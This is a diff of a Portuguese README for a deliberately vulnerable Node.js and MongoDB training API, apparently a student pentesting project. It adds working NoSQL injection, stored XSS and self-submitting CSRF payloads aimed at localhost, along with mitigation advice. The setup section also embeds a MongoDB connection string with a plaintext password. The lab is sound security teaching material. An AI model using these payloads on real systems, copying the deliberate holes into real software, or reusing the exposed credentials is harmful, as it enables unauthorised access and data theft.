@@ -1,6 +1,7 @@
-# API-Vulnerável - Projeto de Estudo de Pentesting em Aplicações Node.js
+# API-Vulnerável - Projeto de Estudo de Pentesting em Aplicações Node.js (Versão 1.0)
 
-Este projeto consiste em uma API RESTful deliberadamente vulnerável, desenvolvida com Node.js, Express e MongoDB. O objetivo é demonstrar na prática vulnerabilidades comuns como NoSQL Injection e boas práticas de segurança web através de testes de pentesting e correções.
+Este projeto consiste em uma API RESTful propositalmente vulnerável, desenvolvida com Node.js, Express e MongoDB.  
+O objetivo é demonstrar na prática vulnerabilidades comuns em aplicações web, incluindo **NoSQL Injection**, **XSS (Cross Site Scripting)** e **CSRF (Cross Site Request Forgery)**.
 
 ---
 
@@ -20,7 +21,7 @@ yarn install
 
 ## Como Rodar a Aplicação Localmente
 
-1. Crie um arquivo `.env` na raiz do projeto com a seguinte variável:
+1. Crie um arquivo `.env` na raiz do projeto com as seguintes variáveis:
 
 ```
 PORT=3000
@@ -33,15 +34,19 @@ MONGODB_URI=mongodb+srv://admin:adminsenha@cluster0.ddytvld.mongodb.net/?retryWr
 node app.js
 ```
 
-O servidor rodará por padrão em `http://localhost:3000`.
+A aplicação estará disponível em:
+
+```
+http://localhost:3000
+```
 
 ---
 
-## Exemplos de Requisições (Postman)
+## Endpoints Disponíveis
 
 ### Criar Usuário
 
-- **POST** `http://localhost:3000/users`
+**POST** `/users`
 
 ```json
 {
@@ -53,11 +58,11 @@ O servidor rodará por padrão em `http://localhost:3000`.
 
 ### Buscar Todos os Usuários
 
-- **GET** `http://localhost:3000/users`
+**GET** `/users`
 
 ### Atualizar Usuário
 
-- **PUT** `http://localhost:3000/users/<ID_DO_USUARIO>`
+**PUT** `/users/:id`
 
 ```json
 {
@@ -67,11 +72,17 @@ O servidor rodará por padrão em `http://localhost:3000`.
 
 ### Deletar Usuário
 
-- **DELETE** `http://localhost:3000/users/<ID_DO_USUARIO>`
+**DELETE** `/users/:id`
 
-### Ataque de NoSQL Injection
+---
 
-- **POST** `http://localhost:3000/users/find`
+## Ataques Demonstrados
+
+### 1️ NoSQL Injection
+
+**Como realizar:**
+
+**POST** `/users/find` com o payload:
 
 ```json
 {
@@ -79,7 +90,59 @@ O servidor rodará por padrão em `http://localhost:3000`.
 }
 ```
 
-Esse payload retorna **todos os usuários**, mesmo sem credenciais válidas.
+**Resultado:**
+- A API retorna todos os usuários, ignorando filtros → demonstração de uma injeção NoSQL bem sucedida.
+
+---
+
+### 2️ Cross Site Scripting (XSS)
+
+**Como realizar:**
+
+**POST** `/users` criando usuário com:
+
+```json
+{
+  "username": "<script>alert('XSS Ativo')</script>",
+  "email": "xss@example.com",
+  "password": "123456"
+}
+```
+
+**Resultado:**
+- Quando listados com **GET /users**, os dados voltam exatamente como foram inseridos.
+- Em uma aplicação frontend que renderize este dado, o script será executado → demonstrando XSS Armazenado.
+
+---
+
+### 3️ Cross Site Request Forgery (CSRF)
+
+**Como realizar:**
+
+Criar um arquivo `index.html` com:
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CSRF Attack Test</h1>
+
+<form action="http://localhost:3000/users" method="POST">
+  <input type="hidden" name="username" value="csrf_injected_user">
+  <input type="hidden" name="email" value="csrf@example.com">
+  <input type="hidden" name="password" value="123456">
+</form>
+
+<script>
+  document.forms[0].submit();
+</script>
+
+</body>
+</html>
+```
+
+**Resultado:**
+- Um usuário é criado na API sem o consentimento da vítima → CSRF realizado com sucesso.
 
 ---
 
@@ -87,34 +150,23 @@ Esse payload retorna **todos os usuários**, mesmo sem credenciais válidas.
 
 ### Sumário Executivo
 
-Este projeto simula vulnerabilidades em aplicações web baseadas em Node.js com foco em segurança ofensiva e defensiva. Ele demonstra na prática como entradas maliciosas podem comprometer a integridade do banco de dados e ensina como mitigar riscos usando técnicas de validação e parametrização. É uma ferramenta educativa voltada para estudantes e profissionais de tecnologia que buscam compreender os riscos reais do desenvolvimento inseguro.
+Este projeto é uma simulação educativa de uma API RESTful com vulnerabilidades propositalmente expostas.  
+O objetivo é demonstrar na prática como entradas maliciosas podem comprometer a aplicação e o banco de dados.  
+As vulnerabilidades incluídas (NoSQL Injection, XSS e CSRF) representam falhas críticas comuns que, se não tratadas, podem ser exploradas em ambientes reais.
 
 ---
 
 ### Relatório Técnico
 
-**Vulnerabilidade Demonstrada:** NoSQL Injection  
-**Comportamento:**  
-Ao enviar um payload como `{"username": {"$ne": null}}` em uma consulta ao banco (sem validação), é possível contornar autenticações e acessar dados de outros usuários.
-
-**Consequências:**
-
-- Vazamento de dados sensíveis
-- Escalada de privilégios
-- Comprometimento da aplicação
-
-**Correções Recomendadas:**
-
-- Uso de validação de tipos (ex: `typeof username === 'string'`)
-- Escape de caracteres especiais e uso de bibliotecas como `express-validator` ou `joi`
-- Uso de filtros específicos (ex: `User.findOne({ username: String(username) })`)
-
-**Permissões no Banco:**  
-Reduza privilégios do usuário da aplicação para leitura e escrita apenas nas coleções necessárias, evitando comandos administrativos.
+| Vulnerabilidade | Como é explorada | Consequências | Como corrigir |
+|-----------------|------------------|---------------|---------------|
+| NoSQL Injection | Enviando payloads especiais para consultas sem validação | Vazamento e manipulação de dados | Validação de entradas e parametrização |
+| XSS (Stored) | Inserção de scripts em campos aceitos pela API | Execução de código malicioso no navegador da vítima | Sanitização de entradas e saídas + CSP |
+| CSRF | Criação de requisições maliciosas automáticas vindas de outro site | Execução de ações sem consentimento do usuário | Uso de tokens anti-CSRF e autenticação via JWT |
 
 ---
 
-## Autores
+##  Autores
 
 - Andressa Lopes
 - Davi Pereira
